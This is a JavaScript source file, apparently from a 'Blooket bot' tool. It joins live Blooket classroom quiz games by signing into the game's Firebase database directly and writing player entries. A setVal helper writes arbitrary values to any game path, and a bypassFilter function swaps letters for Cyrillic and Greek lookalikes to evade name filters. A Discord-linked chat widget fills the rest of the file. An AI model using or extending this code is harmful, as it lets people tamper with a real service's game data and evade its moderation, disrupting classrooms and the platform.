        "Content-Type": "application/json",
        "X-Encrypted": "AES-GCM-256"
      },
      method: "POST",
    });
    
    const responseText = await response.text();
    try {
      const parsed = JSON.parse(responseText);
      if (parsed.encrypted && parsed.data) {
        body = await CryptoModule.decryptObject(parsed.data);
      } else {
        body = parsed;
      }
    } catch {
      body = JSON.parse(responseText);
    }
  }
  
  updateStatus("Connecting to game...");
  if (body.fbShardURL && body.fbToken) {
    const liveApp = initializeApp(
      {
        apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
        authDomain: "blooket-2020.firebaseapp.com",
        projectId: "blooket-2020",
        storageBucket: "blooket-2020.appspot.com",
        messagingSenderId: "741533559105",
        appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
        measurementId: "G-S3H5NGN10Z",
        databaseURL: body.fbShardURL,
      },
      Date.now().toString()
    );
    const auth = getAuth(liveApp);
    await signInWithCustomToken(auth, body.fbToken);
    const db = getDatabase(liveApp);
    await set(ref(db, `${gid}/c/${name}`), {
      b: icog
        ? fblooks[Math.floor(Math.random() * fblooks.length)]
        : "Rainbow Astronaut",
      rt: !0
    });
    botinfo.fbdb = db;
    botinfo.liveApp = liveApp;
    botinfo.connecting = false;
    botinfo.connected = true;
    updateStatus("Connected to game");
    onValue(ref(db, `${gid}`), (data) => {
      if (!botinfo.connected) {
        return;
      }
      onUpdateData(data.val());
    });
    onValue(ref(db, `${gid}/bu`), (data) => {
      if (!botinfo.connected) {
        return;
      }
      onBlock(data.val());
    });
  } else {
    updateStatus("Ready");
    botinfo.connecting = false;
    errorBar("Connect error: " + body.msg);
  }
}

function bypassFilter(str) {
  return str
    .replace(/a/g, "\u0430")
    .replace(/c/g, "\u0441")
    .replace(/e/g, "\u0435")
    .replace(/i/g, "\u0456")
    .replace(/o/g, "\u043E")
    .replace(/p/g, "\u0440")
    .replace(/s/g, "\u0455")
    .replace(/x/g, "\u0445")
    .replace(/y/g, "\u0443")
    .replace(/A/g, "\u0410")
    .replace(/B/g, "\u0412")
    .replace(/C/g, "\u0421")
    .replace(/E/g, "\u0415")
    .replace(/H/g, "\u041D")
    .replace(/I/g, "\u0406")
    .replace(/K/g, "\u039A")
    .replace(/M/g, "\u041C")
    .replace(/N/g, "\u039D")
    .replace(/O/g, "\u041E")
    .replace(/P/g, "\u0420")
    .replace(/S/g, "\u0405")
    .replace(/T/g, "\u0422")
    .replace(/X/g, "\u0425")
    .replace(/Y/g, "\u03A5");
}

async function setVal(path, val) {
  if (!botinfo.connected) {
    errorBar("Cannot set value while disconnected!");
    return;
  }
  if (!botinfo.fbdb) {
    errorBar("Cannot set value when there is no game!");
    return;
  }
  await set(ref(botinfo.fbdb, path), val);
}
updateStatus("Ready");

let chatOpened = false;

function discordChatTest() {
  if (chatOpened) return;

  (() => {
    document.body.insertAdjacentHTML(
      "beforeend",
      `
<div class="mainbodychat" id="mainbodychat">


    <div class="headerdraggable" id="draggable">
        <button class="action_button" onclick="openExternalLink('blooketbot.glitch.me/credits/discordchatlink')">📃</button>
        <button class="action_button_draggable" id="draggable">⇌</button>
        <button class="action_button" onclick="closediscordchat()">X</button>
    </div>

    <div class="channelinfo" id="draggable">
        <div class="startheader" id="draggable">
        <h3 class="channeltitle">#blooket-bot-chat-link</h3>
    </div>
        <h3 class="channeltitle" id="center"></h3>
        <div class="endheader">
            <button class="username" onclick="initiateUsernameSetting()" id="username">🖉 Change username</button>
        </div>
    </div>

    <div class="discordchat">

        
    </div>

    <div class="messagesinput">
        <div class="messagetext">
            
            <textarea class="messagetextarea" placeholder="Enter Message.. Finished Updating, discord.gg/blooket for updates"></textarea>
            
        </div>
    </div>

    
    <div class="setusernamefullbox" id="signupcover">
        <div class="setusernamesubmit">
            <h3>Set Username:</h3>
            <input class="usernameinput" placeholder="Enter a username" id="usernameinput">
            <button class="usernameinputsubmit" onclick="setUsername()">Set Name</button>
        </div>
    </div>

</div>

`
    );

    checkUsername();

    const draggable = document.getElementById("draggable");
    let prevMouseX = 0;
    let prevMouseY = 0;
    let isDragging = false;
    draggable.addEventListener("mousedown", (e) => {
      isDragging = true;
      prevMouseX = e.clientX;
      prevMouseY = e.clientY;
    });
    document.addEventListener("mousemove", (e) => {
      if (!isDragging) return;
      const dx = e.clientX - prevMouseX;
      const dy = e.clientY - prevMouseY;
      const body = document.querySelector(".mainbodychat");
      const rect = body.getBoundingClientRect();
      body.style.left = rect.left + dx + "px";
      body.style.top = rect.top + dy + "px";
      prevMouseX = e.clientX;
      prevMouseY = e.clientY;
    });
    document.addEventListener("mouseup", () => {
      isDragging = false;
    });
  })();

  function createMsg(name, message, profile) {
    let container = document.querySelector(".discordchat");
    let output = document.createElement("div");
    output.className = "messageoutput";
    let info = document.createElement("div");
    info.className = "messageoutputinfo";
    let pfp = document.createElement("img");
    pfp.className = "messagepfp";
    pfp.src = profile;
    output.appendChild(pfp);
    let sending = document.createElement("div");
    sending.className = "usersending";
    sending.innerText = name;
    info.appendChild(sending);
    let msg = document.createElement("div");
    msg.className = "usersmessage";
    msg.innerText = message;
    info.appendChild(msg);
    output.appendChild(info);
    container.appendChild(output);
    updateScroll();
  }

  let textarea = document.querySelector(".messagetextarea");
  textarea.addEventListener("keydown", (e) => {
    if (e.keyCode == 13 && textarea.value.length > 0) {
      sendMsg(`${localStorage.getItem("chatUsername")}`, textarea.value);
      textarea.value = "";
      e.preventDefault();
    }
  });
  function updateScroll() {
    const div = document.querySelector(".discordchat");
    div.scrollTop = div.scrollHeight;
  }

  let ws = new WebSocket("chat");
  ws.onopen = () => {
    document.querySelector(".discordchat").innerHTML = "";
  };
  async function sendData(data) {
    if (isUserBanned()) {
      return;
    }
    const encryptedData = await SecureWebSocket.createSecureMessage(data);
    ws.send(JSON.stringify({ encrypted: true, data: encryptedData }));
    }
  async function sendMsg(name, content) {
    if (ws.readyState != 1) {
      return;
    }

    sendData({ type: "msg", name: "[" + name + "]:", content });
  }
  function handleMessage(data) {
    switch (data.src) {
      case "local":
        createMsg(
          "[Local] " + data.name,
          data.content,
          "https://cdn.discordapp.com/avatars/1332886687772180480/e9b0ebba481a937fae31720e47a2a9fa.jpg?size=256"
        );
        break;
      case "discord":
        createMsg(
          "[Discord] " + data.sender.name,
          data.content,
          data.sender.avatar
        );
        break;
      case "system":
        if (data.content.includes("banned")) {
          document.cookie = "blooketbot_banned=1; path=/; max-age=2592000";
        }
        createMsg(
          "[System] " + data.name,
          data.content,
          "https://cdn.discordapp.com/avatars/1332886687772180480/e9b0ebba481a937fae31720e47a2a9fa.jpg?size=256"
        );
        break;
    }
  }
  async function handleWs(msg) {
    let data;
    try {
      const parsed = JSON.parse(msg);
      if (parsed.encrypted && parsed.data) {
        data = await SecureWebSocket.parseSecureMessage(parsed.data);
      } else {
        data = parsed;
      }
    } catch {
      data = JSON.parse(msg);
    }
    
    switch (data.type) {
      case "error":
        break;
      case "msg":
        handleMessage(data);
        break;
      case "history":
        data.messages.reverse().forEach((e) => {
          if (e.sender.id == 1332886687772180480) {
            createMsg(
              "[Local] " + e.sender.name,
              e.content,
              "https://cdn.discordapp.com/avatars/1332886687772180480/e9b0ebba481a937fae31720e47a2a9fa.jpg?size=256"
            );
            return;
          }
          createMsg(e.sender.name, e.content, e.sender.avatar);
        });
        break;
    }
  }
  function discordConnect() {
    if (ws.readyState == 3) {
      ws = new WebSocket("chat");
    }
    ws.onmessage = (m) => {
      try {
        handleWs(m.data);
      } catch (e) {}
    };
    ws.onclose = discordConnect;
  }
  discordConnect();
}

function isUserBanned() {
  return document.cookie.indexOf('blooketbot_banned=1') !== -1;
}

function openExternalLink(url) {
  window.open(`https://${url}`, "_blank").focus();
}

async function checkUsername() {
  const username = await SecureStorage.get("chatUsername") || localStorage.getItem("chatUsername");

  if (!username) {
    initiateUsernameSetting();
  } else {
    document.getElementById("center").textContent = "Username: " + username;
  }
}

function initiateUsernameSetting() {
  const userSubmitCover = document.getElementById("signupcover");

  userSubmitCover.style.display = "flex";
}

function closediscordchat() {
  const removablebox = document.getElementById("mainbodychat");

  removablebox.remove();
}

async function setUsername() {
  const usernameInput = document.getElementById("usernameinput");

  await SecureStorage.set("chatUsername", usernameInput.value);
  localStorage.setItem("chatUsername", usernameInput.value);

  const signupcover = document.getElementById("signupcover");

  signupcover.style.display = "none";

  checkUsername();
}

function system_message(message, code) {
  const chat = document.querySelector(".discordchat");

  let system_message_container = document.createElement("div");

  system_message_container.className = `system_message_container_code${code}`;

  let system_message_text = document.createElement("h3");

  system_message_text.className = `system_message_text${code}`;

  system_message_text.innerHTML = message;

  system_message_container.appendChild(system_message_text);

  chat.appendChild(system_message_container);
}
